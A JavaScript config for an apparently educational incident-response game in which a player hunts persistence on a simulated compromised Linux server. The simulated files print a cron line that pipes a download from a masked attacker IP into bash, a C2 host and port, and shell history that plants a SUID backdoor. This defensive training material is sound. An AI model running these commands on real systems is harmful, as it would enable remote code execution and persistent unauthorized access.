/* ================================================================
   LINUX-FS-02: Root Hunt — Config
   ================================================================
   Incident response mission. Analyst navigates a compromised server
   filesystem looking for persistence mechanisms: malicious cron,
   attacker SSH key, SUID backdoor. Terminal-input mode with
   context-sensitive commands (ls, cat, find, grep, crontab, remove).

   Converted to TerminalInterpreter config-driven pattern.
   Custom commands: ls, cat, find, grep, remove, crontab
   Overrides: scan, move (filesystem language), status, help
   ================================================================ */

var LINUX_FS_02_CONFIG = {
    id: 'linux-fs-02',
    missionTitle: 'LINUX-FS-02',
    title: 'Root Hunt',
    subtitle: 'Investigate a compromised server. Find and remove persistence.',
    category: 'linux-filesystem',
    difficulty: 2,
    inputMode: 'terminal',
    promptText: 'analyst@linux:~$ ',
    promptLabel: 'OPERATOR TERMINAL',

    briefing: [
        'Compromised server. Find and remove persistence mechanisms.',
        'Investigate cron jobs, SSH keys, and SUID binaries.',
        'Use context-sensitive commands at each directory.'
    ],

    notFoundMsg: 'Unknown command: {cmd}. Type "help".',

    grid: {
        rows: 4,
        cols: 5,
        start: { col: 0, row: 0 },
        cells: [
            ['etc-cron',   'var-log',    'empty',       'wall',       'wall'],
            ['empty',      'home-admin', 'empty',       'ssh-config', 'wall'],
            ['wall',       'tmp-hidden', 'empty',       'empty',      'usr-sbin'],
            ['wall',       'empty',      'proc-list',   'root-dir',   'empty']
        ]
    },

    nodes: {
        'etc-cron':   { label: '/ETC/CRON.D',  abbr: 'CRN', ip: 'srv-web01', os: 'Ubuntu 22.04 LTS', ports: ['N/A'], desc: 'Cron job directory -- scheduled task definitions' },
        'var-log':    { label: '/VAR/LOG',      abbr: 'LOG', ip: 'srv-web01', os: 'Ubuntu 22.04 LTS', ports: ['N/A'], desc: 'System log directory -- auth.log, syslog, kern.log' },
        'home-admin': { label: '/HOME/ADMIN',   abbr: 'HME', ip: 'srv-web01', os: 'Ubuntu 22.04 LTS', ports: ['N/A'], desc: 'Admin user home directory' },
        'ssh-config': { label: '/ETC/SSH',      abbr: 'SSH', ip: 'srv-web01', os: 'OpenSSH 9.6',      ports: ['22/SSH'], desc: 'SSH server configuration and authorized keys' },
        'tmp-hidden': { label: '/TMP/.CACHE',   abbr: 'TMP', ip: 'srv-web01', os: 'Ubuntu 22.04 LTS', ports: ['N/A'], desc: 'Hidden temp directory -- suspicious artifacts' },
        'usr-sbin':   { label: '/USR/SBIN',     abbr: 'BIN', ip: 'srv-web01', os: 'Ubuntu 22.04 LTS', ports: ['N/A'], desc: 'System binaries -- administrative commands' },
        'proc-list':  { label: '/PROC',         abbr: 'PRC', ip: 'srv-web01', os: 'Ubuntu 22.04 LTS', ports: ['N/A'], desc: 'Process listing -- running daemons and services' },
        'root-dir':   { label: '/ROOT',         abbr: 'ROT', ip: 'srv-web01', os: 'Ubuntu 22.04 LTS', ports: ['N/A'], desc: 'Root user home directory' }
    },

    traps: [],
    gates: {},

    customState: {
        maliciousCronFound: false,
        attackerIPFound: false,
        sshKeyRemoved: false,
        suidBackdoorFound: false
    },

    statusFields: [
        { key: 'maliciousCronFound', label: 'Malicious cron',  trueText: 'FOUND',   falseText: 'PENDING' },
        { key: 'attackerIPFound',    label: 'Attacker IP',     trueText: 'FOUND',   falseText: 'PENDING' },
        { key: 'sshKeyRemoved',      label: 'SSH key removed', trueText: 'REMOVED', falseText: 'PENDING' },
        { key: 'suidBackdoorFound',  label: 'SUID backdoor',   trueText: 'FOUND',   falseText: 'PENDING' }
    ],

    objectives: [
        { id: 'cron',    label: 'MALICIOUS CRON FOUND -- backdoor scheduled task identified',      check: 'maliciousCronFound' },
        { id: 'ip',      label: 'ATTACKER IP IDENTIFIED -- source of compromise confirmed',        check: 'attackerIPFound' },
        { id: 'ssh',     label: 'SSH KEY REMOVED -- unauthorized access key purged',                check: 'sshKeyRemoved' },
        { id: 'suid',    label: 'SUID BACKDOOR FOUND -- privilege escalation binary identified',   check: 'suidBackdoorFound' }
    ],

    integrity: 3,

    completion: {
        title: 'ROOT HUNT',
        subtitle: 'Persistence cleared. Server reclaimed.',
        storageKey: 'hexworth_operator_linuxfs02'
    },

    /* ----------------------------------------------------------------
       Terminal Commands -- filesystem IR, context-sensitive per node
       ---------------------------------------------------------------- */
    terminalCommands: {

        /* Override scan with filesystem language */
        'scan': {
            help: 'Survey area',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var col=s.position.col, row=s.position.row, cellType=c.grid.cells[row][col];
                e.printLine('Scanning filesystem...','system'); e.printLine('','system');
                if (cellType!=='empty'&&cellType!=='wall') { var cur=c.nodes[cellType]; e.printLine('Current: '+cur.label+' on '+cur.ip,'heading'); e.printLine(cur.desc,'info'); }
                else e.printLine('Current: Filesystem path (no notable directory)','heading');
                e.printLine('','system'); e.printLine('Adjacent:','heading');
                var dirs=[{name:'North',dc:0,dr:-1},{name:'South',dc:0,dr:1},{name:'East',dc:1,dr:0},{name:'West',dc:-1,dr:0}];
                for (var i=0;i<dirs.length;i++) {
                    var d=dirs[i],nc=col+d.dc,nr=row+d.dr;
                    if (nc<0||nc>=c.grid.cols||nr<0||nr>=c.grid.rows) { e.printLine('  '+d.name+': [filesystem boundary]','system'); continue; }
                    var type=c.grid.cells[nr][nc];
                    if (type==='wall') { e.printLine('  '+d.name+': [no path]','system'); continue; }
                    var key=nc+','+nr; if (!s.visibility[key]||s.visibility[key]==='hidden') s.visibility[key]='revealed';
                    if (type==='empty') e.printLine('  '+d.name+': Filesystem path','info');
                    else { var info=c.nodes[type]; e.printLine('  '+d.name+': '+info.label+' on '+info.ip,'node-info'); }
                }
                e.updateGrid(); e.saveState();
            }
        },

        /* Override move with filesystem language */
        'move': {
            help: 'Move analyst (n/s/e/w)',
            syntax: 'move <dir>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: move <direction>','error'); return; }
                var dirMap={'north':[0,-1],'n':[0,-1],'south':[0,1],'s':[0,1],'east':[1,0],'e':[1,0],'west':[-1,0],'w':[-1,0]};
                var dir=args[0].toLowerCase(); if (!dirMap[dir]) { e.printLine('Unknown direction.','error'); return; }
                var d=dirMap[dir], nc=s.position.col+d[0], nr=s.position.row+d[1];
                if (nc<0||nc>=c.grid.cols||nr<0||nr>=c.grid.rows) { e.printLine('No path beyond filesystem boundary.','error'); return; }
                var cellType=c.grid.cells[nr][nc]; if (cellType==='wall') { e.printLine('No traversable path.','error'); return; }
                s.position={col:nc,row:nr}; s.visibility[nc+','+nr]='visited';
                if (cellType!=='empty' && c.nodes[cellType]) s.nodesDiscovered.add(cellType);
                e.revealAdjacent(nc,nr);
                var dirFull={n:'north',s:'south',e:'east',w:'west'}, dirName=dirFull[dir]||dir;
                if (cellType==='empty') e.printLine('cd '+dirName+'... filesystem path.','system');
                else { var info=c.nodes[cellType]; e.printLine('cd '+info.label,'success'); e.printLine(info.desc,'info'); }
                e.checkObjectives(); e.updateGrid(); e.saveState();
            }
        },

        /* cd alias for move */
        'cd': {
            help: 'Alias for move',
            syntax: 'cd <dir>',
            handler: function(args, ctx) {
                ctx.config.terminalCommands['move'].handler(args, ctx);
            }
        },

        /* Override help with mission-specific command list */
        'help': {
            help: 'Show this reference',
            handler: function(args, ctx) {
                var e = ctx.engine;
                e.printLine('', 'system');
                e.printLine('\u2550\u2550\u2550 COMMAND REFERENCE \u2550\u2550\u2550', 'heading');
                e.printLine('  scan              Survey area', 'info');
                e.printLine('  move <dir>        Move analyst (n/s/e/w)', 'info');
                e.printLine('  ls                List directory contents', 'info');
                e.printLine('  cat <file>        Read a file', 'info');
                e.printLine('  find              Find SUID binaries (in /USR/SBIN)', 'info');
                e.printLine('  grep <pattern>    Search logs (in /VAR/LOG)', 'info');
                e.printLine('  crontab <flag>    Manage cron (in /ETC/CRON.D)', 'info');
                e.printLine('  remove <target>   Remove persistence (in /ETC/SSH)', 'info');
                e.printLine('  status / help / clear', 'info');
            }
        },

        /* Override status with IR-specific info */
        'status': {
            help: 'Show position and objectives',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var cellType = c.grid.cells[s.position.row][s.position.col];
                e.printLine('','system'); e.printLine('[STATUS] Position: '+cellType,'info');
                e.printLine('[STATUS] Dirs: '+s.nodesDiscovered.size,'info');
                var done=0; for (var i=0;i<s.objectives.length;i++) if(s.objectives[i]) done++;
                e.printLine('[STATUS] Objectives: '+done+'/'+c.objectives.length,'info');
            }
        },

        /* Context-sensitive ls */
        'ls': {
            help: 'List directory contents',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var node = c.grid.cells[s.position.row][s.position.col];
                e.printLine('','system');
                if (node==='etc-cron') { e.printLine('total 24','system'); e.printLine('drwxr-xr-x  root root  cron.daily/','info'); e.printLine('drwxr-xr-x  root root  cron.hourly/','info'); e.printLine('-rw-r--r--  root root  system-update','info'); e.printLine('-rw-r--r--  root root  logrotate','info'); e.printLine('-rw-r--r--  root root  .data-sync      <- [SUSPICIOUS]','warning'); e.printLine('','system'); e.printLine('Hint: cat .data-sync to inspect.','system'); }
                else if (node==='var-log') { e.printLine('total 1.2G','system'); e.printLine('-rw-r--r--  root root  auth.log','info'); e.printLine('-rw-r--r--  root root  syslog','info'); e.printLine('-rw-r--r--  root root  kern.log','info'); e.printLine('','system'); e.printLine('Hint: cat auth.log or grep <pattern>','system'); }
                else if (node==='home-admin') { e.printLine('total 48','system'); e.printLine('-rw-r--r--  admin admin  .bashrc','info'); e.printLine('-rw-r--r--  admin admin  .bash_history','info'); e.printLine('drwx------  admin admin  .ssh/','info'); e.printLine('','system'); e.printLine('Hint: cat .bash_history','system'); }
                else if (node==='ssh-config') { e.printLine('total 16','system'); e.printLine('-rw-r--r--  root root  sshd_config','info'); e.printLine('-rw-r--r--  root root  authorized_keys','info'); e.printLine('','system'); e.printLine('Hint: cat authorized_keys','system'); }
                else if (node==='tmp-hidden') { e.printLine('total 3','system'); e.printLine('-rwxr-xr-x  root root  .payload.elf','warning'); e.printLine('-rw-r--r--  root root  .config.dat','warning'); e.printLine('-rw-r--r--  root root  .pid','warning'); e.printLine('','system'); e.printLine('[!] All hidden (dot-prefixed). Attacker staging area.','warning'); }
                else if (node==='usr-sbin') { e.printLine('total 280','system'); e.printLine('-rwsr-xr-x  root root  adduser','info'); e.printLine('-rwsr-xr-x  root root  passwd','info'); e.printLine('-rwsr-xr-x  root root  sudo','info'); e.printLine('-rwsr-xr-x  root root  update-helper   <- [SUSPICIOUS]','warning'); e.printLine('','system'); e.printLine('[!] update-helper has SUID bit. Not standard.','warning'); }
                else if (node==='proc-list') { e.printLine('PID    USER      COMMAND','heading'); e.printLine('1      root      /sbin/init','info'); e.printLine('412    root      /usr/sbin/sshd -D','info'); e.printLine('1337   root      /tmp/.cache/.payload.elf --daemon  <- [SUSPICIOUS]','warning'); e.printLine('2201   root      update-helper --interval 300       <- [SUSPICIOUS]','warning'); }
                else if (node==='root-dir') { e.printLine('total 32','system'); e.printLine('-rw-r--r--  root root  .bashrc','info'); e.printLine('-rw-r--r--  root root  .bash_history','info'); e.printLine('-rw-r--r--  root root  notes.txt','info'); e.printLine('drwxr-xr-x  root root  scripts/','info'); }
                else e.printLine('ls: not at a named directory.','error');
            }
        },

        /* Context-sensitive cat */
        'cat': {
            help: 'Read a file',
            syntax: 'cat <file>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: cat <filename>','error'); return; }
                var file=args.join(' ').toLowerCase(), node=c.grid.cells[s.position.row][s.position.col];
                e.printLine('','system');
                if (node==='etc-cron'&&(file==='.data-sync'||file==='data-sync')) {
                    e.printLine('cat /etc/cron.d/.data-sync','heading'); e.printLine('*/5 * * * * root curl -s http://185.203.xx.xx/c | bash','warning');
                    e.printLine('[!] MALICIOUS: Downloads remote script every 5 minutes.','warning');
                    if (!s.maliciousCronFound) { s.maliciousCronFound=true; e.checkObjectives(); }
                } else if (node==='var-log'&&file==='auth.log') {
                    e.printLine('cat /var/log/auth.log (tail -30)','heading');
                    e.printLine('Mar 04 03:14:20 srv-web01 sshd: Accepted publickey for admin from 185.203.xx.xx port 51234','warning');
                    e.printLine('Mar 04 03:15:01 srv-web01 sudo: admin : COMMAND=/usr/sbin/useradd backdoor','warning');
                    e.printLine('[!] Attacker IP identified: 185.203.xx.xx','success');
                    if (!s.attackerIPFound) { s.attackerIPFound=true; e.checkObjectives(); }
                } else if (node==='ssh-config'&&file==='authorized_keys') {
                    e.printLine('cat /etc/ssh/authorized_keys','heading');
                    e.printLine('ssh-rsa AAAAB3...8kL admin@workstation','info');
                    e.printLine('ssh-rsa AAAAB3...2Rx backdoor@185.203.xx.xx  <- [SUSPICIOUS]','warning');
                    e.printLine('[!] ROGUE KEY DETECTED. Use "remove backdoor" to purge.','warning');
                } else if (node==='home-admin'&&file==='.bash_history') {
                    e.printLine('cat /home/admin/.bash_history','heading');
                    e.printLine('sudo /bin/bash','warning'); e.printLine('cp /tmp/.cache/.payload.elf /usr/sbin/update-helper','warning');
                    e.printLine('chmod u+s /usr/sbin/update-helper','warning');
                } else if (node==='tmp-hidden'&&file==='.config.dat') {
                    e.printLine('cat /tmp/.cache/.config.dat','heading'); e.printLine('c2_host=185.203.xx.xx','warning'); e.printLine('c2_port=4444','warning');
                } else if (node==='root-dir'&&file==='notes.txt') {
                    e.printLine('cat /root/notes.txt','heading'); e.printLine('  [ ] Review authorized_keys','info'); e.printLine('  [ ] Audit cron jobs','info'); e.printLine('  [ ] Check SUID binaries','info');
                } else if (node==='root-dir'&&file==='.bash_history') {
                    e.printLine('cat /root/.bash_history','heading'); e.printLine('cp /tmp/p.elf /tmp/.cache/.payload.elf','warning'); e.printLine('chmod u+s /usr/sbin/update-helper','warning');
                } else { e.printLine('cat: file not found or permission denied.','error'); }
                e.saveState();
            }
        },

        /* SUID binary search -- context-sensitive */
        'find': {
            help: 'Find SUID binaries (in /USR/SBIN)',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var node=c.grid.cells[s.position.row][s.position.col]; e.printLine('','system');
                if (node==='usr-sbin') {
                    e.printLine('find /usr/sbin -perm /4000 -type f','heading');
                    e.printLine('-rwsr-xr-x  root  /usr/sbin/update-helper    <- [SUSPICIOUS]','warning');
                    e.printLine('[!] Backdoored SUID binary identified.','warning');
                    if (!s.suidBackdoorFound) { s.suidBackdoorFound=true; e.checkObjectives(); }
                } else { e.printLine('find: most effective in /USR/SBIN.','system'); }
            }
        },

        /* Remove persistence -- context-sensitive */
        'remove': {
            help: 'Remove persistence (in /ETC/SSH)',
            syntax: 'remove <target>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: remove <target>','error'); return; }
                var node=c.grid.cells[s.position.row][s.position.col];
                if (node==='ssh-config'&&args[0].toLowerCase()==='backdoor') {
                    e.printLine('Removing backdoor key from authorized_keys...','system');
                    e.printLine('[+] SSH key for backdoor@185.203.xx.xx removed.','success');
                    if (!s.sshKeyRemoved) { s.sshKeyRemoved=true; e.checkObjectives(); }
                } else { e.printLine('remove: target not found or wrong directory.','error'); }
                e.saveState();
            }
        },

        /* Grep logs -- context-sensitive */
        'grep': {
            help: 'Search logs (in /VAR/LOG)',
            syntax: 'grep <pattern>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: grep <pattern>','error'); return; }
                var node=c.grid.cells[s.position.row][s.position.col];
                if (node==='var-log') {
                    var pattern=args.join(' ').toLowerCase();
                    e.printLine('grep "'+pattern+'" /var/log/*','heading');
                    if (pattern.indexOf('185')!==-1||pattern.indexOf('fail')!==-1) {
                        e.printLine('auth.log: Failed password for root from 185.203.xx.xx','warning');
                        e.printLine('syslog: cron: curl -s http://185.203.xx.xx/c | bash','warning');
                    } else e.printLine('No matches.','system');
                } else e.printLine('grep: most effective in /VAR/LOG.','system');
            }
        },

        /* Crontab hint command */
        'crontab': {
            help: 'Manage cron (in /ETC/CRON.D)',
            syntax: 'crontab <flag>',
            handler: function(args, ctx) {
                ctx.engine.printLine('Navigate to /ETC/CRON.D and use "cat .data-sync".','system');
            }
        }
    }
};
